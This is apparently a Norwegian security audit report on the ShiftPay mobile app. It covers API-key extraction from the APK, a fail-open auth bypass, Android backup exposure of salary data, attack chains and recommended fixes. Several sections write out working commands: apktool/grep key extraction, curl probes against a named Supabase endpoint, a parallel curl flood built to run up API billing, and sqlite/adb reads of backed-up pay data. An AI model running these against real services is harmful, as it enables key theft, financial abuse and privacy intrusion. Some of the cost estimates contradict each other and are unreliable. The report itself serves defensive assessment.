# Angrepsscenarier: ShiftPay (Re-eval)

> Analysert: 2026-02-23 | Basert pa: `00-recon.md`, `01-code-audit.md`, `02-dep-config-scan.md`
> Erstatter: `03-attack-scenarios.md` fra 2026-02-20 eval
> Scenarier: 4 individuelle + 3 kjeder

---

## Threat Model Oppsummering

- **Apptype:** Mobil-app (Expo/React Native, Android) med stateless Supabase Edge Function backend
- **Sensitive data:** ANTHROPIC_API_KEY (finansiell, betaler for alle API-kall), EXPO_PUBLIC_OCR_API_KEY (ekstraheres fra APK, gir tilgang til OCR-endpoint), lokalt lagrede skiftdata og lonnssatser
- **Angrepsoverflate:** OCR Edge Function (naa auth-gated, men nokkelen er i APK), lokal SQLite-database, Android Auto Backup, deep links, APK-binaren
- **Mest sannsynlige angriper:** Opportunistisk teknisk bruker som laster ned APK fra Play Store og pakker den ut for aa nappe API-nokkelen. Motivasjon: gratis AI API-tilgang eller salg av nokkelen.

### Hva har endret seg siden 2026-02-20

Det mest kritiske funnet fra forrige eval (aapent OCR-endepunkt) er fikset. Angriperen maa naa ekstrahere API-nokkelen fra APK-en foer de kan misbruke endepunktet. Grunngapet er dermed endret:

| Aspekt | 2026-02-20 | 2026-02-23 |
|--------|-----------|-----------|
| Tilgang til OCR | Direkte curl, null barrierer | Krever APK-ekstraksjon (apktool/jadx) |
| Tid til forste angrep | Under 30 sekunder | 5-15 minutter |
| Kompetansekrav | Ingen | Lav-middels (velkjente verktoy) |
| Primae risiko | Aapent API kostnadsmisbruk | Stjalet API-nokkel + kostnadsmisbruk |
| Auth bypass | N/A (ingen auth) | Ja — hvis SHIFTPAY_API_KEY slettes |
| Ny angrepsflate | N/A | Android Auto Backup av lonnsdatabase |

Kortoppsummert: baren er hevdet, men ikke nok til aa stoppe en motivert angriper. Nokkelen er klar til plukking i APK-en.

---

## Individuelle Angrepsscenarier

### Scenario 1: API-nokkel-ekstraksjon fra APK
**Saarbarhet:** FINDING-02 (EXPO_PUBLIC_OCR_API_KEY bundlet i APK)
**Kategori:** Information Disclosure
**Forutsetninger:** Angriperen kan laste ned APK-en fra Play Store, sideloade-lenker, eller direkte fra eierens GitHub Releases.
**Kompleksitet:** Lav

**Angrepssteg:**

1. Angriperen laster ned `shiftpay.apk` fra Play Store eller en distribusjonslenkekjent fra offentlige kilder.
2. APK-en pakkes ut med `apktool` eller `jadx` (begge er gratis, dokumenterte verktoy tilgjengelig fra GitHub). Hele prosessen tar under 2 minutter pa en vanlig laptop.
3. Angriperen soeker etter `EXPO_PUBLIC_OCR_API_KEY` eller `X-API-Key` i den dekompilerte JavaScript-bundlen (`assets/index.android.bundle`). Expo bundler alle `process.env.EXPO_PUBLIC_*`-verdier som cleartext-strenger.
4. Nokkelen er en 64-tegns hex-streng og er umiddelbart lesbar. Ingen ytterligere dekryptering eller reversering nodvendig.
5. Angriperen har naa en gyldig `X-API-Key` som autentiserer mot OCR-endepunktet.

**Eksempel:**
```bash
# Steg 1: Last ned APK
# Steg 2: Pakk ut
apktool d shiftpay.apk -o shiftpay_out

# Steg 3: Sok etter nokkelen i bundlet JS
grep -r "OCR_API_KEY\|X-API-Key\|EXPO_PUBLIC_OCR" shiftpay_out/assets/ | head -5
# Alternativ: sok etter 64-tegns hex-strenger
grep -oE '[0-9a-f]{64}' shiftpay_out/assets/index.android.bundle | head -5

# Steg 4: Test nokkelen
curl -s -o /dev/null -w "%{http_code}" \
  -X POST "https://ifzngxyvdzaobyxtnrcy.supabase.co/functions/v1/ocr" \
  -H "X-API-Key: <ekstrahert-nokkel>" \
  -F "file=@/dev/urandom;type=image/jpeg"
# Forventet respons: 400 (ugyldig bilde) — men IKKE 401 — betyr nokkelen er gyldig
```

**Impact:** Angriperen har full, gyldig tilgang til OCR-endepunktet — identisk med hva legitime app-brukere har. Dette er inngangspunktet for alle kostnadsbaserte angrep (se Scenario 2 og kjede A).
**Sannsynlighet:** Hoy. APK reverse engineering er velkjent og lavterskel. `apktool` og `jadx` er topplastede open source-verktoy. Methoden er dokumentert i hundrevis av artikler. En videregaaende elev med interesse for programmering klarer dette pa forste forsok.

---

### Scenario 2: Kostnadsmisbruk via ekstrahert API-nokkel
**Saarbarhet:** FINDING-02 (API-nokkel i APK) + FINDING-03 (ingen rate limiting)
**Kategori:** Denial of Service (finansiell)
**Forutsetninger:** Angriperen har fullfort Scenario 1 og har en gyldig `X-API-Key`.
**Kompleksitet:** Lav

**Angrepssteg:**

1. Med nokkelen fra Scenario 1 sender angriperen autentiserte POST-requests til OCR-endepunktet.
2. Hvert kall sender en 4.9 MB JPEG (rett under grensen) for aa maksimere token-forbruk i Claude Haiku Vision. Haiku behandler bildet og genererer opptil 4000 output-tokens per kall.
3. Angriperen kjoerer et enkelt parallellscript som sender 20-50 samtidige requests i en loop.
4. Hver runde med 50 requests koster eieren ca. $0.50-1.50 i Anthropic-fakturering (Claude Haiku: $0.01 per 1K output-tokens, 4000 tokens/kall = $0.05/kall, x50 = $2.50 per runde).
5. Uten rate limiting kan dette kjores i timer eller dager frem til Anthropic-billing-grensen er naedd.

**Eksempel-payload:**
```bash
OCR_URL="https://ifzngxyvdzaobyxtnrcy.supabase.co/functions/v1/ocr"
API_KEY="<ekstrahert-nokkel>"

# Generer et stort test-bilde (nesten 5MB)
convert -size 3000x4000 xc:white /tmp/payload.jpg

# Parallell bombing — 50 workers, 200 iterasjoner = 10 000 requests
for i in $(seq 1 200); do
  for j in $(seq 1 50); do
    curl -s -X POST "$OCR_URL" \
      -H "X-API-Key: $API_KEY" \
      -F "file=@/tmp/payload.jpg;type=image/jpeg" \
      -o /dev/null &
  done
  wait
done
# Total: 10 000 requests x $0.05 = $500 i Anthropic-regning
```

**Konkrete kostnadsanslag:**

| Varighet | Requests (50 parallelt) | Antropic-kostnad (est.) |
|----------|------------------------|------------------------|
| 10 minutter | ~3 000 | ~$150 |
| 1 time | ~18 000 | ~$900 |
| 8 timer (over natten) | ~144 000 | ~$7 200 |

Merk: Faktisk kostnad avhenger av bildeinnhold (blankt bilde gir faerre tokens enn en ekte vaktplan), men overhead-tokens fra system prompt og bruker-prompt kjoerer uansett.

**Impact:** Direkte oekonomisk skade pa eierens Anthropic-konto. Uten en hard billing-cap i Anthropic Dashboard er dette ubegrenset. Tjenesten kan ogsa bli utilgjengelig for legitime brukere naar kvoten er overskredet.
**Sannsynlighet:** Middels. Krever forst APK-ekstraksjon (Scenario 1), men det er som nevnt lav terskel. Motivasjon kan vaere: konkurrent, gratis AI-tilgang, sabotasje, eller bare ren opportunisme.

---

### Scenario 3: Auth bypass via slettet Supabase secret
**Saarbarhet:** FINDING-04 (auth bypass naar SHIFTPAY_API_KEY ikke er satt)
**Kategori:** Elevation of Privilege
**Forutsetninger:** `SHIFTPAY_API_KEY` er ikke satt i Supabase secrets (enten aldri satt, slettet ved rot, eller ved hemmelighets-rotasjon med glemt re-setting).
**Kompleksitet:** Lav (naar tilstanden inntreffer)

**Angrepssteg:**

1. Eieren roterer `SHIFTPAY_API_KEY` (f.eks. etter mistanke om kompromittering) og sletter den gamle verdien, men glemmer aa sette en ny foer ny deploy, eller deploy skjer foer `secrets set`-kommandoen kjoeres.
2. Supabase Edge Function starter med `SHIFTPAY_API_KEY = undefined`.
3. Auth-blokken i `index.ts:76-82` kjoeres: `if (appApiKey)` evaluerer til `false`, og hele autentiseringssjekken hoppes over.
4. Endepunktet er naa aapent for alle — identisk med tilstanden foer forrige eval fikset FINDING-01.
5. Enhver angriper som prover endepunktet uten `X-API-Key` vil faa `200 OK` i stedet for `401 Unauthorized`. Dette kan oppdages av automatiserte scannere innen minutter.

**Kode som muliggjor angrepet:**
```typescript
// supabase/functions/ocr/index.ts:76-82
const appApiKey = Deno.env.get("SHIFTPAY_API_KEY");
if (appApiKey) {          // <-- FEILEN: "ikke satt" = skip auth
  const provided = req.headers.get("x-api-key");
  if (provided !== appApiKey) {
    return jsonResponse({ detail: "Unauthorized" }, 401, req);
  }
}
// Rekker hit uten X-API-Key-sjekk hvis SHIFTPAY_API_KEY = undefined
```

**Eksempel-angrep:**
```bash
# Angriperen prover endepunktet uten API-nokkel
curl -s -o /dev/null -w "%{http_code}" \
  -X POST "https://ifzngxyvdzaobyxtnrcy.supabase.co/functions/v1/ocr" \
  -F "file=@test.jpg;type=image/jpeg"
# Med SHIFTPAY_API_KEY satt: 401
# Med SHIFTPAY_API_KEY IKKE satt: 400 (ugyldig bilde) -- men IKKE 401
# Angriperen ser 400 og skjonner at auth er borte
```

**Impact:** Endepunktet aapnes for alle — ingen API-nokkel nodvendig. Kombinert med ingen rate limiting kan kostnadsmisbruk startes direkte, uten engang aa pakke ut APK-en foerst.
**Sannsynlighet:** Lav-middels sannsynlighet for at tilstanden inntreffer, men automatiske scannere vil oppdage det innen timer og utnytte det umiddelbart. En produksjonshendelse (rotasjon uten re-setting, Supabase-driftsavbrudd, secrets-reset) kan trigge dette uventet.

---

### Scenario 4: Lonnsdatalekk via Android Auto Backup
**Saarbarhet:** FINDING-05 (android:allowBackup="true")
**Kategori:** Information Disclosure
**Forutsetninger:** Brukerens Google-konto er tilgjengelig for angriperen (kompromittert Google-konto, delt familiekonto, arbeidsgiver med MDM-tilgang).
**Kompleksitet:** Middels

**Angrepssteg:**

1. Android Auto Backup laster automatisk opp `shiftpay.db` til brukerens Google-konto (Google Drive backup) ved jaevnlige intervaller.
2. En angriper med tilgang til Google-kontoen (f.eks. et kontrollerenede familiemedlem, en arbeidsgiver med MDM, eller en angriper som har phishet Google-passordet) kan laste ned app-backup-filene.
3. SQLite-filen er ukryptert. Angriperen aapner den med SQLite Browser og ser:
   - `tariff_rates`: Eksakt timelonn, alle tilleggssatser (natt, helg, helligdag, overtid)
   - `shifts`: Alle skift med datoer, tidspunkter, og bekreftelsesstatus — arbeidsmonsteret over tid

**Eksempel:**
```bash
# Angriperen laster ned backup fra Google Drive
# (via Google Takeout, Google Drive API, eller direkte fra Google account)
# Backup-filen inneholder APK-spesifikk data-mappe

# Aapne databasen
sqlite3 shiftpay.db "SELECT base_rate, night_supplement, weekend_supplement FROM tariff_rates;"
# Resultat: 385.5 | 65.0 | 100.0
# Angriperen vet naa eksakt hva brukeren tjener

sqlite3 shiftpay.db "
  SELECT date, start_time, end_time, shift_type, status
  FROM shifts
  WHERE date >= '01.01.2026'
  ORDER BY date DESC;
"
# Angriperen ser alle vakter -- nattskift-frekvens, fraversmonster, arbeidstid
```

**Alternative veier til backup:**
```bash
# Via ADB paa samme nettverk (USB-debugging paaskrudd)
adb backup -apk -noshared -f shiftpay_backup.ab com.shiftpay.app
android-backup-extractor shiftpay_backup.ab shiftpay_backup.tar
tar -xf shiftpay_backup.tar
# Finn shiftpay.db i apps/com.shiftpay.app/db/
```

**Impact:** Full eksponering av brukerens lonnsbetingelser og arbeidsmoenster. For en helsarbeider kan dette avslore: effektiv timelonn, overtidsfrekvens, nattskiftbelastning, ferieperioder, arbeidskapasitet. Sensitiv informasjon i en parrelasjon eller overfor en kontrollerende arbeidsgiver. Bryter med appens "privacy by design"-prinsipp — brukeren tror dataene bare er pa enheten.
**Sannsynlighet:** Lav. Krever sekundaer kompromittering (Google-konto) eller fysisk tilgang. Men det bryter tillitten brukeren har til en app som markedsforer seg pa lokal-only lagring.

---

## Angrepskjeder

### Kjede A: APK-ekstraksjon til ukontrollert kostnadsmisbruk

**Involverte funn:** FINDING-02 (API-nokkel i APK) + FINDING-03 (ingen rate limiting) + FINDING-04 (auth bypass)
**Samlet severity:** High

**Kjede:**

1. **[FINDING-02]** Angriperen laster ned ShiftPay APK og pakker ut JavaScript-bundlen med `apktool`. `EXPO_PUBLIC_OCR_API_KEY` er cleartext i bundlet kode. Tid: under 10 minutter.
2. **[FINDING-03]** Med gyldig API-nokkel sender angriperen autentiserte requests uten noen throttle-mekanisme. Ingen IP-blokkering, ingen per-key-kvote, ingen burst-deteksjon.
3. Angriperen kjorer et parallelscript (50 workers) med 4.9 MB bilder. Uten rate limiting er det bare Anthropic-billing-grensen som stopper det.
4. **[FINDING-04 — Forverrer kjeden]** Hvis eieren oppdager misbruket og roterer `SHIFTPAY_API_KEY` men glemmer aa sette den paany i Supabase-secrets, skifter endepunktet til helt aapent (ingen auth). Angriperen trenger da ikke engang den stjaalte nokkelen lenger — og andre angripere kan bli med.
5. **Sluttresultat:** Hundrevis til tusenvis av USD i Anthropic-fakturering. Mulig tjenesteavbrudd for legitime brukere naar billing-cap naaes (hvis satt) eller kvoten er oppbrukt.

**Tidslinjeeksempel:**
```
T+00:00  Angriperen laster ned APK fra Play Store
T+00:08  apktool-ekstraksjon fullfort, API-nokkel identifisert
T+00:12  Nokkel verifisert med test-request (400-respons uten 401 = gyldig)
T+00:15  Angrepsscript starter (50 parallelle workers)
T+01:00  Ca. 3600 requests sendt — Anthropic-regning: ~$180
T+08:00  Over natten: ~28 800 requests — Anthropic-regning: ~$1 440
         (med billing-cap: tjenesten er utilgjengelig for legitime brukere)
```

**Hvorfor dette er verre enn enkeltfunnene:**
FINDING-02 alene gir bare en nokkel — begrenser ikke misbruksvolum. FINDING-03 alene er et problem kun naar noen allerede har tilgang. Kombinasjonen betyr at enhver teknisk bruker med APK-tilgang kan drive ubegrenset API-kostnader mot eieren. FINDING-04 er en "failsafe that fails open" — det som skal vaere en fallback ved feil gjor vondt verre ved kompromittering.

---

### Kjede B: Stille auth-bypass under hendelsesrespons

**Involverte funn:** FINDING-04 (auth bypass) + FINDING-02 (API-nokkel i APK, som trigger rotasjonen)
**Samlet severity:** High

**Kjede:**

1. **[FINDING-02]** Eieren mistenker at API-nokkelen er kompromittert (f.eks. overraskende Anthropic-regning, eller de har lest denne rapporten).
2. Eieren kjorer `supabase secrets unset SHIFTPAY_API_KEY` for aa deaktivere den stjaalte nokkelen umiddelbart.
3. **[FINDING-04]** Med `SHIFTPAY_API_KEY` fjernet fra Supabase secrets, er endepunktet naa HELT AAPENT — verre enn foer (da var i det minste nokkelen en barriere).
4. Eieren bruker tid pa aa generere og distribuere en ny nokkel (oppdatere `.env`, kjoere EAS build, vente pa build-pipeline). I mellomtiden er endepunktet aapent.
5. Automatiserte scannere som overvaaket endepunktet for 401-responser oppdager overgangen til ikke-401 og starter umiddelbart misbruk.

**Tidslinje for hendelsesrespons-vinduet:**
```
T+00:00  Eier oppdager mistenkelig aktivitet, fjerner SHIFTPAY_API_KEY
T+00:00  Endepunkt: AAPENT for alle (ingen auth)
T+00:05  Automatiserte scannere oppdager at 401 er borte
T+00:10  Massemisbruk starter fra ukjente angripere (ikke bare den opprinnelige)
T+00:30  Eier genererer ny nokkel og setter: supabase secrets set SHIFTPAY_API_KEY=...
T+00:30  Auth er gjenopprettet -- men 20 minutter med aapent endpoint er nok
```

**Hvorfor dette er verre enn enkeltfunnene:**
Dette er en klassisk "fix som apen saaer". Den rimelige og korrekte handlingen (roter kompromittert nokkel) utloser en verre tilstand pga. auth-bypass-designet. Uten denne kjeden ville hendelsesrespons vaert trygg.

---

### Kjede C: Gammel Supabase-prosjekt-URL + timing-angrep (lavere sannsynlighet)

**Involverte funn:** FINDING-01 (timing-angrep pa API-nokkel-sammenligning) + eas.json-funn (gammel Supabase-URL i git-historikk)
**Samlet severity:** Medium

**Kjede:**

1. **[eas.json-funn]** Git-historikken inneholder en gammel Supabase project-URL (`dnjsrxbiswsmivzxfqza.supabase.co`). Hvis dette prosjektet fortsatt er aktivt og OCR-funksjonen ikke er fjernet der, kan den vaere saarbar.
2. **[FINDING-01]** `!==`-sammenlikning av API-nokkelen er ikke konstant-tid. Med nok malinger (> 10 000 requests fra et lavlatens-nettverk) kan statistisk timing-analyse lekke nokkelens prefikstegn.
3. En angriper som har identifisert den gamle Supabase-URL-en og har lavlatens-tilgang (f.eks. fra et Supabase-naboregion) kan forsoke timing-angrep mot den gamle instansen.
4. Med tilstrekkelig statistisk grunnlag (akademisk vist mulig for edge-functions med stabil latens) kan deler av API-nokkelen lekkest.

**Realistisk vurdering:**
Dette er en teoretisk kjede. Praktisk gjennomforing av timing-angrep mot Supabase Edge Functions er ekstremt vanskelig pga. variabel nettverkslatens og Deno-runtime-overhead som overdover timing-signalet. Inkludert for fullstendighets skyld og fordi den gamle Supabase-URL-en i git-historikken er en konkret, etterproevbar risiko.

**Impact:** Lav-medium. Gammel URL bor sjekkes og prosjektet deaktiveres. Timing-angrep bor fikses (5-minutters fix) for aa fjerne tvilen.

---

## Sammenligning med tidligere eval (2026-02-20)

### Hva er dramatisk bedre

| Gammel kritisk angrepskjede | Status |
|-----------------------------|--------|
| Chain 1: Aapent endpoint -> direkte kostnadsmisbruk | ELIMINERT. Endpoint krever naa API-nokkel. |
| Chain 2: Prompt injection via aapent endpoint -> korrupt brukerdata | ELIMINERT. Schema-validering pa server + klient. |
| Chain 3: Error disclosure -> timed attack | ELIMINERT. Generisk feilmelding, ingen intern info. |

Alle tre kjeder fra forrige eval er eliminerte. Dette er solid arbeid.

### Hva er nytt og gjenstaer

| Ny angrepsflate | Severity | Forklaring |
|-----------------|----------|------------|
| API-nokkel i APK | Medium | EXPO_PUBLIC_ er arkitektonisk — ny risiko er at nokkelen naa faktisk er satt og gyldig |
| Ingen rate limiting | High | Var ogsa High foer, men kombinert med APK-ekstraksjon er dette et komplett angrep |
| Auth bypass ved sletting | Medium | Ny finding — dev-convenience som feiler aapent i prod |
| Android Auto Backup | Low | Ny finding — bryter privacy-by-design-prinsippet |

### Endring i angrepsmodell

**Foer:** Hvem som helst -> direkte curl -> gratis API-tilgang (0 teknisk kompetanse).
**Naa:** Hvem som helst med APK -> apktool -> 10 minutter -> API-nokkel -> identisk misbruk.

Baren er hevdet, men ikke eliminert. For en Play Store-distribuert app der alle har tilgang til APK, er dette en medium barriare, ikke en hoy.

---

## Risikomatrise

| Funn | Sannsynlighet | Impact | Risikovurdering |
|------|--------------|--------|-----------------|
| F-02+F-03: APK-nokkel + ingen rate limiting (Kjede A) | Hoy | Hoy (finansiell) | **HIGH** |
| F-04: Auth bypass ved sletting (Kjede B) | Lav-middels | Hoy | **HIGH** |
| F-02: API-nokkel ekstraheres fra APK | Hoy | Medium | **MEDIUM** |
| F-03: Ingen rate limiting | Hoy | Medium (alene) | **MEDIUM** |
| F-04: Auth bypass (tilstanden i seg selv) | Lav | Kritisk (naar det skjer) | **MEDIUM** |
| F-01: Timing-angrep pa nokkel-sammenligning | Svart lav | Lav | **LOW** |
| F-05: Android Auto Backup | Lav | Medium | **LOW** |
| F-07: Stale permissions i manifest | Lav | Lav | **LOW** |
| F-06: Mangler UUID-validering i period/[id] | Lav | Lav | **LOW** |
| F-08: OCR-nokkel mangler i EAS Secrets | Middels | Lav-medium | **LOW** |

### Matrise (Sannsynlighet x Impact)

```
              Lav impact    Medium impact   Hoy impact   Kritisk impact
             +-----------+--------------+------------+--------------+
Hoy          |           | F-02, F-03   |            |              |
sanns.       |           | (enkeltfunn) |            |              |
             +-----------+--------------+------------+--------------+
Middels      |           | F-04 (enkelt)|  Kjede A   |              |
sanns.       |           | F-08         |            |              |
             +-----------+--------------+------------+--------------+
Lav          | F-01,F-06 | F-05, F-07  |  Kjede B   |              |
sanns.       | F-07      |              |            |              |
             +-----------+--------------+------------+--------------+
```

---

## Anbefalinger (prioritert)

### 1. Blokker disse forst — inngaar i flest kjeder

**F-04: Fjern auth bypass for SHIFTPAY_API_KEY**
Dette er en 5-minutters fix som eliminerer Kjede B og gjor hendelsesrespons trygg:

```typescript
// supabase/functions/ocr/index.ts — erstatt linje 76-82:
const appApiKey = Deno.env.get("SHIFTPAY_API_KEY");
if (!appApiKey) {
  // Fail closed: secret not configured = service unavailable
  return jsonResponse({ detail: "Service unavailable" }, 503, req);
}
const provided = req.headers.get("x-api-key");
if (provided !== appApiKey) {
  return jsonResponse({ detail: "Unauthorized" }, 401, req);
}
```

Estimert tid: 5 minutter + deploy.

**F-03: Sett billing-cap i Anthropic Dashboard**
Ingen kode, 5 minutter. Gaar til Dashboard -> Settings -> Limits. Sett en hard cap pa f.eks. $50/maaned. Dette er det eneste backstop-et mot Kjede A uavhengig av kodefix.

### 2. Quick wins — lav innsats, hoy verdi

**F-01: Konstant-tid nokkel-sammenligning**
Eliminerer timing-angrepssaarbarhet og er best practice. Bruk HMAC-basert sammenligning (se `01-code-audit.md:37-54`). Estimert tid: 15 minutter.

**F-08: Sett OCR-nokkel i EAS Secrets**
```bash
eas secret:create --name EXPO_PUBLIC_OCR_API_KEY --value <nokkel> --scope project
```
Sikrer at EAS cloud builds fungerer med autentisering. Estimert tid: 5 minutter.

### 3. Planlegg disse — viktige men krever mer vurdering

**F-03: Rate limiting pa OCR-endepunktet**
Reduserer blast radius for Kjede A dramatisk. Alternativene:
- Option A: In-memory rate limiter i Edge Function (per API-nokkel, 10 req/min) — se `01-code-audit.md:75-88`. Husk: in-memory state i Supabase Edge Functions er per-isolate, ikke global. For virkelig effektiv rate limiting treng Supabase KV eller Upstash Redis.
- Option B: Sett billing-cap i Anthropic Dashboard (enklest, men bare et backstop — ikke forebyggende).
- Option C: Flytt til EAS Secrets (ikke EXPO_PUBLIC_) + proxylayer (eliminerer APK-eksponering, men komplekst).

**F-05: android:allowBackup="false"**
Konsistent med privacy-by-design-prinsippet:
```json
// app.json
"android": {
  "allowBackup": false
}
```
Estimert tid: 5 minutter + ny build.

### 4. Akseptert risiko — dokumenter valget

**F-02: EXPO_PUBLIC_OCR_API_KEY i APK**
Dette er en arkitektonisk begrensning. Mitigering: billing-cap (allerede anbefalt), key rotation-rutine (dokumenter naar og hvordan nokkelen roteres), og rate limiting. Hvis prosjektet skalerer, vurder EAS Secrets + server-side proxy som fjerner nokkel-eksponeringen helt.

Definert rotasjons-terskel (foreslaatt):
- Roter ved: oekonomisk overraskelse pa Anthropic-kontoen, eller mistenkt APK-lekkasje
- Fremgangsmaate: `supabase secrets set SHIFTPAY_API_KEY=<ny>` -> oppdater `.env` -> `eas secret:create` -> ny EAS build

---

## Near Misses — Hva som er korrekt implementert (og holder)

Disse ble vurdert som potensielle angrepsveier, men er riktig haandtert:

1. **SQL-injeksjon:** Alle DB-kall bruker parameteriserte queries. En `date`-verdi fra OCR med SQL i seg lagres som literal streng. Ingen risiko.

2. **Prompt injection -> korrupt data:** Schema-validering pa server (regex pa dato/tid, enum pa shift_type) og client (validateOcrResponse) filtrerer bort ugyldig LLM-output. En injisert streng som `"99.99.9999"` som dato blokkeres pa begge sider.

3. **Deep link UUID-injeksjon:** `confirm/[shiftId].tsx` validerer UUID v4-format foer DB-oppslag. En malformatert `shiftId` gir 404, ikke unntakstilstand.

4. **Intern feilinformasjon til klient:** `catch`-blokken i OCR-endepunktet returnerer alltid generisk `"OCR processing failed. Please try again."` — aldri stack trace eller Anthropic SDK-detaljer.

5. **EXPO_PUBLIC_API_URL er ikke en secret:** Supabase-URL-en er en offentlig endepunkt-adresse. Den eneste hemmeligheten er `EXPO_PUBLIC_OCR_API_KEY`. URL i APK er akseptabelt. (Merknad: den gamle Supabase-prosjekt-URL-en i git-historikken bor sjekkes.)

6. **Feilhaaendtering i db.ts:** `withDb()` haandterer stale SQLite-koblinger (NullPointerException pa Android) med retry-logikk. Ingen stille feil, ingen partial state.
